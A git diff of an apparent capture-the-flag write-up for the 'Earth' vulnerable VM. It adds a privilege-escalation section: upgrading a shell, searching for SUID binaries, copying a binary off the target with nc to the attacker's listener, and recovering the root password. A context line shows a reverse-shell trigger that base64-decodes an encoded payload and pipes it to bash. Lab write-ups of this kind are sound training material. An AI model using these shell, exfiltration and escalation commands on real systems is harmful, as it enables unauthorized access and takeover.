@@ -1,6 +1,7 @@
-# Sumamry
+<img width="535" height="115" alt="image" src="https://github.com/user-attachments/assets/61b292e9-ae3d-4548-b4cc-dfee4a830fc8" /># Sumamry
 - Reconnaissance
 - Exploitation
+- Escalation
 
 # Reconnaissance
 After configuring the VM into my virtual box, it is time to identify the ip address of the target.
@@ -100,4 +101,64 @@ Done and now just run the command and I will receive the connection. The thing i
 echo {encoded_stirng} | base64 -d | bash
 ```
 
-Boom!!! 
+Boom!!! Got access to the target
+
+# Escalation 
+
+First I have to set up a backdoor for reconnecting in case I accidentally disconnect it
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+Now even if I use Ctrl+Z I still can reinitialize using the following command
+<img width="516" height="203" alt="Ảnh chụp màn hình 2025-09-18 200033" src="https://github.com/user-attachments/assets/a5279180-b63f-416f-931d-32e220b9c9d6" />
+
+```
+stty raw -echo;fg;reset
+```
+<img width="423" height="114" alt="Screenshot 2025-09-18 200422" src="https://github.com/user-attachments/assets/2babfc2b-7a99-49e6-89cd-50e1e567a8ad" />
+Let's find the most vulnerable file which requires finding the binaries with SUID bit:
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+<img width="387" height="323" alt="Screenshot 2025-09-18 200653" src="https://github.com/user-attachments/assets/a6a73d45-7fa3-441b-a1d3-fca3de7c5533" />
+I notice the `/usr/bin/reset_root` stands out, I have never met one before so I would try my best to exploit this. 
+
+<img width="359" height="48" alt="Screenshot 2025-09-18 200911" src="https://github.com/user-attachments/assets/0a153106-6baa-435d-b5f9-98040567347e" />
+But first, I need to bring this file to my host machine to further examine.
+On our host
+```
+nc -lp 9999 > reset_root
+```
+On the remote server
+```
+nc -w 3 {ip} 9999 < /usr/bin/reset_root
+```
+Now there is a tool to find out what is going on with this file called `ltrace`
+For someone who do not have `ltrace` and do not know what it is. `ltrace` is a tool for debugging 'tldr' in short. So using this tool to find out what is going on with the binary file.
+Granting execution permission for this file
+```
+chmod +x reset_root
+```
+<img width="637" height="205" alt="Screenshot 2025-09-18 202831" src="https://github.com/user-attachments/assets/42e27660-b30e-4a55-8b3e-644ceedb1848" />
+I know the reason why this file failed to run because I reckon that on that server which does not include these 3 file caused the file to fail.
+Therefore, I only need to create those file and attempt to run the binary file again.
+```
+touch /dev/shm/kHgTFI5G
+touch /dev/shm/Zw7bV9U5
+touch /tmp/kcMOWewe
+reset_root
+```
+<img width="535" height="115" alt="Screenshot 2025-09-18 203129" src="https://github.com/user-attachments/assets/903f60f7-130e-40bd-8bf5-9af54687e4e2" />
+After executing, I get the password for root which is `Earth`. Then, escalating my permission into root using the following command:
+```
+su - 
+```
+Then the server gonna ask us about the password then just input the above password and I get access under `root` user successfully.
+<img width="545" height="64" alt="Screenshot 2025-09-18 203738" src="https://github.com/user-attachments/assets/cf36f83d-df3e-4967-8449-0be224f8d660" />
+<img width="591" height="497" alt="Screenshot 2025-09-18 203820" src="https://github.com/user-attachments/assets/a67f8c44-1372-4b8e-9909-c0c2431dc6f8" />
+
+I finished the room and got both of the flags
+Happy hacking!!!
